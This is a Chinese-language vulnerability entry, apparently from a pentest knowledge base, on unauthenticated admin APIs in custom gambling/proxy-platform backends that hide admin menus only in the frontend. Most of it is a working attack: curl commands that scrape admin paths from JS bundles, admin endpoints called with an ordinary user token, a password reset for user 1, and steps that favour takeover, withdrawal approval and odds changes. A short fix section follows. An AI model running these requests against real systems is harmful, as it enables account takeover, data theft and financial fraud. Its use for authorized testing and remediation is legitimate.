---
title: 后台管理 API 未授权（只在前端隐藏菜单）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研包网/代理后台
versions: 任意
ports: 80, 443
keywords: admin api, 未授权, 越权, 前端隐藏, 菜单
entry: 普通 token 直接打 /api/admin/*
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

- 前端 bundle 里有 `/api/admin/...`、`/prod-api/admin/...`、`/manage/...` 路径（`grep -o '/api/admin/[a-zA-Z0-9_/-]*' app.js`）。
- 普通账号的响应里出现 `isAdmin`/`menus` 之类的字段。

## 前置条件

- 任意普通账号 token；从 JS 里能捞到管理端路径。

## PoC

```bash
# 从 bundle 抽管理端路径
curl -s https://target/static/js/app.js | grep -oE '/api/admin/[a-zA-Z0-9_/-]+' | sort -u | head -30

# 用普通 token 直接打
curl -s https://target/api/admin/user/list?pageNo=1 -H "Authorization: Bearer <普通 token>"
curl -s https://target/api/admin/withdraw/list?status=pending -H "Authorization: Bearer <普通 token>"
curl -s -X POST https://target/api/admin/user/resetPassword -H "Authorization: Bearer <普通 token>" -H 'content-type: application/json' -d '{"uid":1,"password":"Passw0rd!"}'
```

## 利用步骤

1. 从 JS / swagger / 老版本 H5 包里抽管理端路径清单。
2. 用普通 token 逐个打，关注 `200 + 数据`（403/401 才是正常）。
3. 命中列表类 → 全站会员/订单；命中写操作 → 直接接管账号或改审核状态。
4. 优先找"重置密码""改角色""审核提现""改赔率"这几类写接口。
5. 证据：一条 200 的列表请求 + 响应条数；写操作只对自己账号做。

## 修复与缓解

- 服务端按角色鉴权（不是前端隐藏）；管理端独立域名/内网。
- 路径不可枚举（加统一网关前缀）；所有 admin 接口打审计与限速。

## 参考

- OWASP API Security Top 10：API5 BFLA。
